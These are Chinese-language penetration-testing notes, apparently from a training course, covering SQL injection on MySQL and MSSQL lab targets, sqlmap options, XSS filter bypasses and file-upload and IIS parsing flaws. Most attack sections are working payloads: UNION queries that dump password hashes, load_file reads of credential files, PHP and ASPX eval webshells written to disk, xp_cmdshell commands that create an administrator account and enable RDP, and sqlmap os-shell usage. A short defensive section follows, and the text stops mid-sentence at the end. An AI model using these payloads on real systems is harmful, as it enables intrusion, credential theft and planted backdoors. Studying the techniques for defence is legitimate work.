<h3 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h3><p>基础知识一：<br>mysql4：没有information_schema库信息，因此需要获取库名、表名、字段名时，只能靠猜<br>mysql5：拥有information_schema库信息，因此可以轻松获取库名、表名、字段名<br>基础知识二：<br>mysql中root用户是最高权限用户；<br>mysql中保存用户信息的库是mysql库，对应表user表；<br>等到用户密码信息，可以进行反向破解，最终获取用户名和密码，可以远程登录数据库<br>ps：数据库8.0之后，密码的加密方式换了（sha2 早期mysql_native_password），不能用传统破解方式获取明文密码</p>
<h4 id="Mysql实战案例"><a href="#Mysql实战案例" class="headerlink" title="Mysql实战案例"></a>Mysql实战案例</h4><p>典型页面：<a target="_blank" rel="noopener" href="http://192.168.138.130:90/dvwa/vulnerabilities/sqli/">http://192.168.138.130:90/dvwa/vulnerabilities/sqli/</a></p>
<h5 id="检查注入点"><a href="#检查注入点" class="headerlink" title="检查注入点"></a>检查注入点</h5><p>在搜索框中输入：1’ or 71&#x3D;1</p>
<p><img src="/img/oldboy/1-25.png"></p>
<p>存在注入点</p>
<h5 id="判断查询字段数"><a href="#判断查询字段数" class="headerlink" title="判断查询字段数"></a>判断查询字段数</h5><p><a target="_blank" rel="noopener" href="http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1%5C%27+order+by+1%5C%23&Submit=Submit#">http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1\%27+order+by+1\%23&amp;Submit=Submit#</a></p>
<p>1’ order by 1#</p>
<p>发现没有报错说明字段数&gt;1</p>
<p><a target="_blank" rel="noopener" href="http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1%5C%27+order+by+2%5C%23&Submit=Submit#">http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1\%27+order+by+2\%23&amp;Submit=Submit#</a></p>
<p>1’  order by 2#</p>
<p>发现没有报错说明字段数&gt;2</p>
<p><a target="_blank" rel="noopener" href="http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1%5C%27++order+by+3%5C%23&Submit=Submit#">http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1\%27++order+by+3\%23&amp;Submit=Submit#</a></p>
<p>1’  order by 3#</p>
<p>页面报错：Unknown column ‘3’ in ‘order clause’</p>
<p>证明：查询的字段数为2</p>
<h5 id="获取网站业务数据库名称"><a href="#获取网站业务数据库名称" class="headerlink" title="获取网站业务数据库名称"></a>获取网站业务数据库名称</h5><p>查看当前的数据库和用户：</p>
<p><a target="_blank" rel="noopener" href="http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1%5C%27+union+select+user%5C(%5C)%5C,database%5C(%5C)%5C%23&Submit=Submit#">http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1\%27+union+select+user\%28\%29\%2Cdatabase\%28\%29\%23&amp;Submit=Submit#</a></p>
<p>1’ union select user(),database()#</p>
<p>结果为：</p>
<p><img src="/img/oldboy/1-26.png"></p>
<p>获取数据库信息</p>
<p><a target="_blank" rel="noopener" href="http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1%5C%27union+select+1%5C,group_concat%5C(schema_name%5C)+from+information_schema.schemata%5C%23&Submit=Submit#">http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1\%27union+select+1\%2Cgroup_concat\%28schema_name\%29+from+information_schema.schemata\%23&amp;Submit=Submit#</a></p>
<p>1’union select 1,group_concat(schema_name) from information_schema.schemata#</p>
<p><img src="/img/oldboy/1-27.png"></p>
<p>concat()和group_concat()区别：</p>
<ul>
<li><code>CONCAT()</code> 用于将多个字符串或列值连接成一个字符串，适用于单行操作。</li>
<li><code>GROUP_CONCAT()</code> 用于将分组中的多行值连接成一个字符串，适用于多行操作，并且支持去重、排序和自定义分隔符。</li>
</ul>
<h5 id="获取dvwa表名"><a href="#获取dvwa表名" class="headerlink" title="获取dvwa表名"></a>获取dvwa表名</h5><p>获取表名：</p>
<p><a target="_blank" rel="noopener" href="http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1%5C%27union+select+1%5C,group_concat%5C(table_name%5C)+from+information_schema.tables+where+table_schema%5C=database%5C(%5C)%5C%23&Submit=Submit#">http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1\%27union+select+1\%2Cgroup_concat\%28table_name\%29+from+information_schema.tables+where+table_schema\%3Ddatabase\%28\%29\%23&amp;Submit=Submit#</a></p>
<p>1’union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</p>
<p><img src="/img/oldboy/1-28.png"></p>
<h5 id="获取表里的字段值"><a href="#获取表里的字段值" class="headerlink" title="获取表里的字段值"></a>获取表里的字段值</h5><p>获取表里的字段值</p>
<p>1’ union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273 #</p>
<p>table_name&#x3D;0x7573657273 使用十六进制编码的原因是：table_name&#x3D;users会报错</p>
<p><img src="/img/oldboy/1-29.png"></p>
<h5 id="获取字段内容"><a href="#获取字段内容" class="headerlink" title="获取字段内容"></a>获取字段内容</h5><p>获取字段内容</p>
<p><a target="_blank" rel="noopener" href="http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=++++1%5C%27+union+select+1%5C,group_concat%5C(user_id%5C,0x7c%5C,first_name%5C,0x7c%5C,last_name%5C,0x7c%5C,user%5C,0x7c%5C,password%5C,0x7c%5C,avatar%5C,0x7c%5C)+from+users%5C%23&Submit=Submit#">http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=++++1\%27+union+select+1\%2Cgroup_concat\%28user_id\%2C0x7c\%2Cfirst_name\%2C0x7c\%2Clast_name\%2C0x7c\%2Cuser\%2C0x7c\%2Cpassword\%2C0x7c\%2Cavatar\%2C0x7c\%29+from+users\%23&amp;Submit=Submit#</a></p>
<p>​    1’ union select 1,group_concat(user_id,0x7c,first_name,0x7c,last_name,0x7c,user,0x7c,password,0x7c,avatar,0x7c) from users#</p>
<p>结果：</p>
<p>1|admin|admin|admin|5f4dcc3b5aa765d61d8327deb882cf99|&#x2F;hackable&#x2F;users&#x2F;admin.jpg|,</p>
<p>2|Gordon|Brown|gordonb|e99a18c428cb38d5f260853678922e03|&#x2F;hackable&#x2F;users&#x2F;gordonb.jpg|,</p>
<p>3|Hack|Me|1337|8d3533d75ae2c3966d7e0d4fcc69216b|&#x2F;hackable&#x2F;users&#x2F;1337.jpg|,</p>
<p>4|Pablo|Picasso|pablo|0d107d09f5bbe40cade3de5c71e9e9b7|&#x2F;hackable&#x2F;users&#x2F;pablo.jpg|,</p>
<p>5|Bob|Smith|smithy|5</p>
<h5 id="进一步渗透"><a href="#进一步渗透" class="headerlink" title="进一步渗透"></a>进一步渗透</h5><p>前提条件：</p>
<ul>
<li>需要知道远程Web目录</li>
<li>需要mysql root权限</li>
<li>需要远程目录有写权限</li>
<li>需要数据库开启secure_file_priv 相当于secure_file_priv的值为空，不为空不充许写入webshell （默认不开启，需要修改mysql.ini配置文件）</li>
</ul>
<p>获取web路径方法</p>
<p>%27%20union%20select%201,load_file(0x433A5C5C57494E444F57535C5C73797374656D33325C5C696E65747372765C5C4D657461426173652E786D6C)+–+&amp;Submit&#x3D;Submit  路径记得转化为十六进制</p>
<p>0x433A5C5C57494E444F57535C5C73797374656D33325C5C696E65747372765C5C4D657461426173652E786D6C</p>
<p>&#x3D;C:\WINDOWS\system32\inetsrv\MetaBase.xml</p>
<p>常见Windows下的配置文件</p>
<ol>
<li>c:&#x2F;windows&#x2F;php.ini &#x2F;&#x2F;php配置信息</li>
<li>c:&#x2F;windows&#x2F;my.ini &#x2F;&#x2F;MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码</li>
<li>c:\mysql\data\mysql\user.MYD &#x2F;&#x2F;存储了mysql.user表中的数据库连接密码</li>
<li>c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置</li>
<li>d:\APACHE\Apache2\conf\httpd.conf </li>
<li>c:\windows\repair\sam &#x2F;&#x2F;存储了WINDOWS系统初次安装的密码</li>
</ol>
<p>常见Linux下的配置文件</p>
<ol>
<li>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;apache2缺省配置文件 </li>
<li>&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf &#x2F;&#x2F;虚拟网站设置 </li>
<li>&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F;PHP相关设置 </li>
<li>&#x2F;etc&#x2F;sysconfig&#x2F;iptables &#x2F;&#x2F;从中得到防火墙规则策略</li>
<li>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; apache配置文件 </li>
<li>&#x2F;etc&#x2F;rsyncd.conf &#x2F;&#x2F;同步程序配置文件</li>
<li>&#x2F;etc&#x2F;my.cnf &#x2F;&#x2F;mysql的配置文件</li>
<li>&#x2F;etc&#x2F;redhat-release &#x2F;&#x2F;系统版本</li>
<li>&#x2F;usr&#x2F;local&#x2F;resin-3.0.22&#x2F;conf&#x2F;resin.conf 针对3.0.22的RESIN配置文件查看</li>
</ol>
<p>服务器读取文件：</p>
<p>union select 1,load_file(‘c:\boot.ini’) #</p>
<p>写webshell获取权限：</p>
<p>union select “<?php @eval($_POST['123']);?>“,2 into outfile “C:\phpStudy\WWW\123.php”#</p>
<h3 id="MsSQL"><a href="#MsSQL" class="headerlink" title="MsSQL"></a>MsSQL</h3><p>数据库用户信息：</p>
<ul>
<li>_sa<ul>
<li>数据库服务中权限最高的用户，同时此用户还可以对系统进行管理操作</li>
</ul>
</li>
<li>_dbowner<ul>
<li>可以编写webshell</li>
</ul>
</li>
<li>_public<ul>
<li>只能查询数据库中数据库信息、</li>
</ul>
</li>
</ul>
<p>典型网站：192.168.138.130:85&#x2F;sqlserver&#x2F;1.aspx？xxser&#x3D;</p>
<h4 id="SA用户攻击方式"><a href="#SA用户攻击方式" class="headerlink" title="_SA用户攻击方式"></a>_SA用户攻击方式</h4><p><strong>1、SQL注入检查服务类型</strong></p>
<p>​	2 and exists(select * from sysobjects)</p>
<p>​	执行成功-确认为MsSQL数据库</p>
<p><strong>2、SQL注入检查当前用户</strong></p>
<p>​	确认用户名称信息：</p>
<p>​		and system_user&#x3D;0		通过IE报错页面获取用户名(推荐低版本IE浏览器)</p>
<p>​	是否具有特权权限</p>
<p>​		and 1&#x3D;(select IS_SRVROLEMEMBER(‘sysadmin’))	检查注入位置是否具有sa权限(无报错，有报错选择其他用户)</p>
<p><strong>3、SQL确认存储过程功能</strong></p>
<p>​	（判断xp_cmdshell）只有激活了存储过程功能，才能使数据库管理员操作系统</p>
<p>​	and 1&#x3D;(select count(*) from master.dbo.sysobjects where name&#x3D;’xp_cmdshell’)	执行没报错-功能处于激活状态</p>
<p>​	EXEC sp_configure ‘show advanced options’, 1;  RECONFIGURE;  EXEC sp_configure ‘xp_cmdshell’, 1;  RECONFIGURE;–</p>
<p>​	——-激活存储过程功能</p>
<p><strong>4、系统操作命令</strong></p>
<p>​	添加用户账号(系统用户创建)：;exec master..xp_cmdshell ‘net user test test &#x2F;add’		</p>
<p>​	划分用户到管理组：;exec master..xp_cmdshell ‘net localgroup administrators test &#x2F;add’</p>
<p>​	启动3389远程功能：exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal Server’,’ fDenyTSConnections’,’REG_DWORD’,0;</p>
<h4 id="dbowner用户攻击方式"><a href="#dbowner用户攻击方式" class="headerlink" title="_dbowner用户攻击方式"></a>_dbowner用户攻击方式</h4><p><strong>1、SQL注入检查当前用户</strong></p>
<p>​	确认用户名称信息：and 1&#x3D;(SELECT IS_MEMBER(‘db_owner’));–		判断当前用户是否为db_owner权限</p>
<p> <strong>2、SQL注入获取网站路径</strong></p>
<p>​	①通过报错信息</p>
<p>​	②通过搜索引擎（百度、谷歌）</p>
<p>​	③通过相关语句</p>
<p>​		;drop table black;create Table black(result varchar(7996) null,id int not null identity(1,1))–</p>
<p>​		;insert into black exec master..xp_cmdshell ‘dir &#x2F;s c:\1.aspx’–</p>
<p>​		and (select result from black where id&#x3D;4)&gt;0 –</p>
<p>3、SQL注入木马文件</p>
<p>​		%20;exec%20master..xp_cmdshell%20’Echo%20”&lt;%@ Page Language&#x3D;”Jscript”%&gt;&lt;%eval(Request.Item[“123”],”unsafe”);%&gt;&gt;”%20c:\wwwtest\iis-xxser.com–wwwroot\sqlserver\muma.aspx’–</p>
<p>dir &#x2F;s c:\1.aspx：搜索1.aspx的路径，因为注入的地址就是1.aspx</p>
<p>使用webshell工具链接即可</p>
<h4 id="public用户攻击方式"><a href="#public用户攻击方式" class="headerlink" title="_public用户攻击方式"></a>_public用户攻击方式</h4><p>and 1&#x3D;(SELECT IS_MEMBER(‘db_owner’));–  	报错，说明是_public，只能进行脱裤操作</p>
<p><strong>1、确认数据库名称信息</strong></p>
<p>​	业务数据库确认</p>
<p>​	and db_name()&#x3D;0–</p>
<p>​	获取mssql所有数据库名和路径</p>
<p>​	%20and%200&#x3D;(select%20top%202%20cast([name]%20as%20nvarchar(256))%2bchar(94)%2bcast([filename]%20as%20nvarchar(256))%20from%20(select%20top%202%20dbid,name,filename%20from%20[master].[dbo].[sysdatabases]%20order%20by%20[dbid])%20t%20order%20by%20[dbid]%20desc)–</p>
<p>&#x3D;&#x3D; and 0&#x3D;(select top 2 cast([name] as nvarchar(256))+char(94)+cast([filename] as nvarchar(256)) from (select top 2 dbid,name,filename from [master].[dbo].[sysdatabases] order by [dbid]) t order by [dbid] desc)–</p>
<p><strong>2、确认数据库表名称信息</strong></p>
<p>​	获取当前数据库所有表名</p>
<p>​	and 0&lt;&gt;(select top 1 name from testdb.dbo.sysobjects where xtype&#x3D;0x7500 and name not in (select top 2 name from testdb.dbo.sysobjects where xtype&#x3D;0x7500))–</p>
<p><strong>3、确认数据表字段信息</strong></p>
<p>爆表名及字段名</p>
<p>​	爆出表中第一个字段：having 1&#x3D;1–</p>
<p>​	爆出表中第二个字段：group by admin.id having 1&#x3D;1–</p>
<p>​	爆出表中第三个字段：group by admin.id,admin.name having 1&#x3D;1–</p>
<p>4、获取数据信息</p>
<p><code>/**/and/**/(select/**/top/**/1/**/isnull(cast([id]/**/as/**/nvarchar(4000)),char(32))\%2bchar(94)\%2bisnull(cast([name]/**/as/**/nvarchar(4000)),char(32))\%2bchar(94)\%2bisnull(cast([password]/**/as/**/nvarchar(4000)),char(32))/**/from/**/[testdb]..[admin]/**/where/**/1=1/**/and/**/id/**/not/**/in/**/(select/**/top/**/0/**/id/**/from/**/[testdb]..[admin]/**/where/**/1=1/**/group/**/by/**/id))\%3E0/**/and/**/1=1</code></p>
<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>1、使用函数过滤，对敏感字符进行过滤</p>
<p>2、使用预编译和绑定变量</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String <span class="keyword">sql</span><span class="operator">=</span>&quot;select id,no from user where id=?&quot;;</span><br><span class="line">    Preparedstatement ps<span class="operator">=</span>conn.preparestatement(<span class="keyword">sql</span>);</span><br><span class="line">    ps.setInt(<span class="number">1</span>,id);</span><br><span class="line">    ps.executeQuery();</span><br></pre></td></tr></table></figure>

<p>通过prepare预编译函数会预先编译好,也就是SQL引I擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，无论你输入的是时么，都不会影响该sql语句的语法结构了。<strong>只会被当做字符串字面值参数</strong></p>
<p>3、使用WAF防火墙开启防SQL注入</p>
<p>4、直接下载相关防范注入文件，通过incloud包含放在网站配置文件里面</p>
<h2 id="SQL注入工具"><a href="#SQL注入工具" class="headerlink" title="SQL注入工具"></a>SQL注入工具</h2><h3 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h3><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">sqlmapproject&#x2F;sqlmap: Automatic SQL injection and database takeover tool</a></p>
<p><strong>SqlMap常用参数</strong></p>
<p>1、判断测试点</p>
<p>​	-r 指定注入参数（需要将请求头信息存储在指定文件，注意：复制请求同用crtl+a再复制）<br>​		python sqlmap.py -r get.txt<br>​	<br>​	-u get方法注入，使用时需要加入注入的参数信息<br>​		python sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.example.com/index.php?id=1">http://www.example.com/index.php?id=1</a><br>​	<br>​	–level&#x3D;LEVEL	执行测试的等级（1-5，默认为1）,使用–level参数且数值&gt;&#x3D;2的时候也会检查cookie里面的参数，当&gt;&#x3D;3的时候将检查User-agent和Referer。<br>​		python sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.example.com/index.php?id=1">http://www.example.com/index.php?id=1</a> –level&#x3D;2<br>​	<br>​	–risk&#x3D;RISK		 执行测试的风险（0-3，默认为1）,默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。<br>​		python sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.example.com/index.php?id=1">http://www.example.com/index.php?id=1</a> –risk&#x3D;3<br>​	<br>​	-v 				ERBOSE信息级别: 0-6 （缺省1），其值具体含义：“0”只显示python错误以及严重的信息；1同时显示基本信息和警告信息（默认）；“2”同时显示debug信息；“3”同时显示注入的payload；“4”同时显示HTTP请	求；“5”同时显示HTTP响应头；“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3。<br>​		python sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.example.com/index.php?id=1">http://www.example.com/index.php?id=1</a> -v 3<br>​	<br>​	-p 				后面接参数，针对单个参数注入<br>​		python sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.example.com/index.php?id=1&name=ews">http://www.example.com/index.php?id=1&amp;name=ews</a> -p id<br>​	<br>​	–threads		线程数，默认为10</p>
<p>​	-batch-smart	只能判断测试（推荐）<br>​		python sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.example.com/index.php?id=1">http://www.example.com/index.php?id=1</a> -batch-smart<br>​	<br>​	–mobile		模拟测试手机环境站点 </p>
<p>​	-m 				批量注入，在指定文件内输入多个目标<br>​		python sqlmap.py -m test.txt -batch-smart</p>
<p>2、获取数据</p>
<p>获取相关信息命令：</p>
<ul>
<li>​	–dbs  &#x2F;&#x2F;默认情况系sqlmap会自动的探测web应用后端的数据库类型：MySQL、Oracle、PostgreSQL、MicrosoftSQL Server、Microsoft Access、SQLite、Firebird、Sybase、SAPMaxDB、DB2 </li>
<li>​	–current-user：大多数数据库中可检测到数据库管理系统当前用户 </li>
<li>​	–current-db：当前连接数据库名 </li>
<li>​	–is-dba：判断当前的用户是否为管理 </li>
<li>​	–users：列出数据库所有所有用户</li>
</ul>
<p>获取表名				–tables -D 数据库名</p>
<p>获取字段名			    –columns -T user -D abc</p>
<p>获取数据内容			-T user -C username,password,email –dump</p>
<p>3、特殊命令</p>
<p>读取文件内容			–file-read &#x2F;etc&#x2F;password</p>
<p>系统交互的shell		    –os-shell</p>
<p>写webshell			     –file-write  “c:&#x2F;3.txt” –file-dest “C:&#x2F;phpStudy&#x2F;WWW&#x2F;3.php” -v1     </p>
<p>sqlmap过waf			 –tamper “[模块名]”					–存储在tamper目录下</p>
<p> [sqlmap绕过过滤的 tamper 脚本分类汇总.xlsx](sqlmap绕过过滤的 tamper 脚本分类汇总.xlsx) </p>
<h1 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>XSS全称（Cross Site Scripting）跨站脚本攻击，XSS是指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的。</p>
<p>漏洞出现原因：</p>
<p>​	程序对用户的输入没有进行严格的限制，导致恶意脚本在服务器前端有效代码解析执行从而产生危害</p>
<p>同源策略：</p>
<p>​	为了安全考虑，所有浏览器都约定了“同源策略”，同源策略禁止页面加载或执行与自身来源不同的域的任何脚本，既不同域之间不能使用JS进行操作。比如：x.com域名下的js不能操作y.com域名下的对象</p>
<p>那么为什么要有同源策略？ 比如一个恶意网站的页面通过js嵌入了银行的登录页面（二者不同源），如果没有同源限制，恶意网页上的javascript脚本就可以在用户登录银行的时候获取用户名和密码。</p>
<p>Tips:下面这些标签跨域加载资源(资源类型是有限止的)是不受同源策略限制的</p>
<script src="...">  //加载本地js执行
<img src="...">  //图片
<link href="...">  //css
<iframe src="...">  //任意资源
同源策略修改

D:\phpStudy\WWW\pikachu\pkxss\rkeypress\rkserver.php
   同之前的案例到后台设置好Access-Control-Allow-Origin，设置为*，既允许所有人访问。



## 攻击类型

### 反射型XSS

**中危漏洞**

交互的数据一般不会被存在在数据库里面,只是简单的把用户输入的数据反射给浏览器，一次性，所见即所得。 







### 存储型XSS

**高危漏洞**

交互的数据会被存在在数据库里面,永久性存储,具有很强的稳定性。





### DOM型XSS



**低危漏洞**

不与后台服务器产生数据交互,通过前端的dom节点形成的XSS漏洞。

什么是DOM:DOM全称是Document Object Model，也就是文档对象模型。我们可以将DOM理解为，一个与系统平台和编程语言无关的接口，程序和脚本可以通过这个接口动态地访问和修改文档内容、结构和样式。当创建好一个页面并加载到浏览器时，DOM就悄然而生，它会把网页文档转换为一个文档对象，主要功能是处理网页内容。故可以使用 Javascript 语言来操作DOM以达到网页的目的。



## 攻击发现

XSS漏洞注入点：（植入js代码）

- HTML context
- Attribute Context
- URL Context
- Style Context
- Script Context









## 测试方法

1、工具扫描：APPscan、AWVS 

2、手工测试：Burpsuite、firefox(hackbar)、XSSER XSSF
    使用手工检测Web应用程序是否存在XSS漏洞时，最重要的是考虑那里有输入，输入的数据在什么地方输出。在进行手工检测XSS时，人毕竟不像软件那样不知疲惫，所以一定要选择有特殊意义的字符，这样可以快速测试是否存在XSS。

（1）在目标站点上找到输入点,比如查询接口,留言板等;
（2）输入一组"特殊字符+唯一识别字符",点击提交后,查看返回的源码,是否有做对应的处理;
（3）通过搜索定位到唯一字符,结合唯一字符前后语法确认是否可以构造执行js的条件(构造闭合);提交构造的脚本代码,看是否可以成功执行,如果成功执行则说明存在XSS漏洞;







## 漏洞防御

**防御方法01：前端表单限制**
    绕过方式01：修改前端页面代码
    绕过方法02：利用bp修改请求字段信息

**防御方法02：匹配字段信息做过滤（输入）**
\$message=preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/', '', \$_GET['message']); 
\$message=preg_replace('/\<script>/i', '', $\_GET['message']); 

​	绕过方法01：字母大小混合绕过
​		123'">\<SCRIPT>alert(123)\</SCRIPT>
<p>​	绕过方法02：字符信息拼凑绕过<br>​		&lt;sc&lt;script&gt;ript&gt;alert(‘63252’)&lt;&#x2F;scr&lt;script&gt;ipt&gt;<br>​	绕过方法03：注释干扰后台绕过<br>​		&lt;sc&lt;!–test–&gt;ript&gt;alert(‘63252’)&lt;&#x2F;scr&lt;!–tshauie–&gt;ipt&gt;<br>​	绕过方法04：代码信息编码绕过</p>
<p>​	&lt;SCRIPT&gt;alert(123)&lt;&#x2F;SCRIPT&gt; – 编码处理 base64  url</p>
<p>​	例：使用事件属性<br>​		\img src&#x3D;# onerror&#x3D;”alert(‘oldboy’)”&#x2F;&gt;<br>​		&lt;img src&#x3D;x onerror&#x3D;”&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#121;&#97;&#110;&#103;&#115;&#104;&#117;&#97;&#110;&#103;&#39;&#41;”&#x2F;&gt;<br>​	使用HTML进行编码<br>​	绕过方法05：更换代码标签绕过<br>​		&lt;img src&#x3D;# onerror&#x3D;”alert(‘oldboy’)”&#x2F;&gt;</p>
<p><strong>防御方法03：利用php函数进行防御（htmlspecialchars()）</strong><br>    绕过方法01：加载不关注引号的攻击代码信息<br>        q’ onclick&#x3D;’alert(111)’</p>
<p><strong>防御方法04：构建js代码格式进行防御</strong><br>绕过方法01：<br>‘11’&lt;&#x2F;script&gt;&lt;script&gt;alert(1111)&lt;&#x2F;script&gt;</p>
<p><a target="_blank" rel="noopener" href="https://www.fujieace.com/penetration-test/xss-100.html">XSS攻击绕过过滤方法大全（约100种） - 付杰博客</a></p>
<p>总结：<br>防御：考虑各种绕过情况，一般是需要在输入和输出环节，对传入的字段信息都做处理<br>绕过：需要根据php页面防御代码信息，实现有效绕过</p>
<h1 id="文件上传下载漏洞"><a href="#文件上传下载漏洞" class="headerlink" title="文件上传下载漏洞"></a>文件上传下载漏洞</h1><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>大多数网站都有文件上传的接口，但如果在后台开发时并没有对上传的文件进行安全考虑或采用了有缺陷的措施，导致攻击者可以通过一些手段绕过安全措施从而上传一些恶意文件，从而通过该恶意文件的访问来控制整个后台</p>
<h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><img src="/img/oldboy/image-20250304160544834.png" alt="image-20250304160544834" style="zoom: 80\%;" />



<p>在验证上传点是否存在漏洞时，直接上传普通文件，文件名发生了改变极大可能为白名单绕过</p>
<p><img src="/img/oldboy/image-20250304221013611.png" alt="image-20250304221013611"></p>
<h3 id="漏洞使用"><a href="#漏洞使用" class="headerlink" title="漏洞使用"></a>漏洞使用</h3><p><img src="/img/oldboy/image-20250304221428832.png" alt="image-20250304221428832"></p>
<p>1、客户端JavaScript前端检查绕过</p>
<p>​	一般通过查看源代码是否有相关检查</p>
<ol>
<li>可以通过bp抓包绕过</li>
<li>在前端页面禁用JS，直接上传webshell</li>
</ol>
<p>2、黑名单限制上传</p>
<p>​	通过限制相关的.php&#x2F;.jsp&#x2F;.asp等后缀</p>
<ol>
<li><p>使用未被限制的后缀绕过（如php3、php5需要配置相关配置文件）</p>
</li>
<li><p>使用.htaccess文件进行绕过(需要在http.conf文件中开启AllowOverried All )</p>
<p>如果是windows电脑使用php和windows环境叠加特性</p>
<p>​	双引号”   &#x3D;  点号.</p>
<p>​	大于符号&gt;  &#x3D;  问号?</p>
<p>​	小于符号&lt;  &#x3D;  星号*</p>
<p>上传后为空文件，需要将文件名改为4.&lt;或4.&lt;&lt;&lt;或4.&gt;&gt;&gt;或4.&gt;&gt;&lt;后再次上传，重写4.php文件内容</p>
</li>
<li><p>后缀大小写绕过</p>
</li>
<li><p>利用windows特性，增加空格( )和点(.)</p>
</li>
<li><p>利用windows特性，使用::$DATA文件流进行绕过</p>
</li>
</ol>
<blockquote>
<blockquote>
<p>.htaccess解释：</p>
<p>​	SetHandler application&#x2F;x-http-php的意思是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行。</p>
<p>通过这个机制可以先上传一个.htaccess文件，然后上传一个正常后缀的文件，相互搭配，实现php解析</p>
</blockquote>
</blockquote>
<p>3、白名单限制上传</p>
<ol>
<li>使用上传路径名%00截断(php版本要小于5.3.4，5.3.4及以上已经修复该问题；magic_quotes_gpc需要为OFF状态)</li>
<li>上传路径0x00绕过</li>
<li>绕过文件头检查，添加GIF图片的文件头GIF89a</li>
<li>copy 1.jpg &#x2F;b + shell.php &#x2F;a webshell.jpg合并绕过</li>
<li>绕过二次渲染，使用图片坚强马</li>
</ol>
<p>使用图片马需要搭配文件包含漏洞，才能使用</p>
<h2 id="中间件解析漏洞"><a href="#中间件解析漏洞" class="headerlink" title="中间件解析漏洞"></a>中间件解析漏洞</h2><h3 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h3><p><a href="./%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E.docx">.&#x2F;中间件解析漏洞.docx</a></p>
<h4 id="目录解析漏洞"><a href="#目录解析漏洞" class="headerlink" title="目录解析漏洞"></a>目录解析漏洞</h4><p>在 <strong>IIS5.x&#x2F;6.0</strong> 中，在网站下建立文件夹的名字为*.asp、*.asa、*.cer、*.cdx 的文件夹，那么其目录内的任何扩展名的文件都会被IIS当做asp文件来解释并执行。例如创建目录 test.asp，那么 &#x2F;test.asp&#x2F;1.jpg 将被当做asp文件来执行。假设黑客可以控制上传文件夹路径，就可以不管上传后你的图片改不改名都能拿shell了</p>
<h4 id="文件名解析漏洞"><a href="#文件名解析漏洞" class="headerlink" title="文件名解析漏洞"></a>文件名解析漏洞</h4><p>在 IIS5.x&#x2F;6.0 中， 分号后面的不被解析，也就是说 xie.asp;.jpg 会被服务器看成是xie.asp。还有IIS6.0默认的可执行文件除了asp还包含这两种 .asa  .cer 。而有些网站对用户上传的文件进行校验，只是校验其后缀名。所以我们只要上传 *.asp;.jpg、*.asa;.jpg、*.cer;.jpg 后缀的文件，就可以通过服务器校验，并且服务器会把它当成asp文件执行。</p>
<h4 id="畸形解析漏洞"><a href="#畸形解析漏洞" class="headerlink" title="畸形解析漏洞"></a>畸形解析漏洞</h4><p>在 IIS7.0中，在默认Fast-CGI开启状况下，我们往图片里面写入下面的代码</p>
